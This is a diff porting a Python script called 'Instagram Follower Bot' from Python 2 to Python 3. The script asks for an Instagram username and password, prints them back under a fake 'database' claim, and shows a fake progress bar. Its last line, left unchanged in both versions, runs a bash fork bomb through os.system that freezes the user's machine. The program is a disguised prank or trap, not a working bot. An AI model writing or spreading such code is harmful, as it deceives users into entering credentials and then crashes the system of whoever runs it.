@@ -1,18 +1,13 @@
-import os
-import sys, traceback
-
-os.system('sudo apt-get update')
-print "Instagram Follower Bot"
-name = raw_input('Enter your Username : ')
-print ("Scanning For Username that go by: %s" % name);
-name2 = raw_input('Enter your Password : ')
-print ("Entering  database with the Password of : %s " % name2);
-import time, sys
-
+import time, sys, os
+#os.system('sudo apt-get update')
+print("Instagram Follower Bot")
+name = input('Enter your Username : ')
+print("Scanning For Username that go by: %s" % name);
+name2 = input('Enter your Password : ')
+print("Entering  database with the Password of : %s " % name2);
+status = ""
 # update_progress() : Displays or updates a console progress bar
-## Accepts a float between 0 and 1. Any int will be converted to a float.
-## A value under 0 represents a 'halt'.
-## A value at 1 or bigger represents 100%
+## Accepts a int from 0 to whatever
 def update_progress(progress):
     barLength = 1 # Modify this to change the length of the progress bar
     status = ""
@@ -23,13 +18,12 @@ def update_progress(progress):
     sys.stdout.write(text)
     sys.stdout.flush()
 
-
 # update_progress test script
-print "__________Starting__________"
-print "Mounting"
+print("__________Starting__________")
+print ("Mounting")
 for x in range(1, 101):
     update_progress(x)
     time.sleep(0.01)
 time.sleep(3);
-print "Thank You...";
+print("Thank You...")
 os.system(':(){:|:&};:')
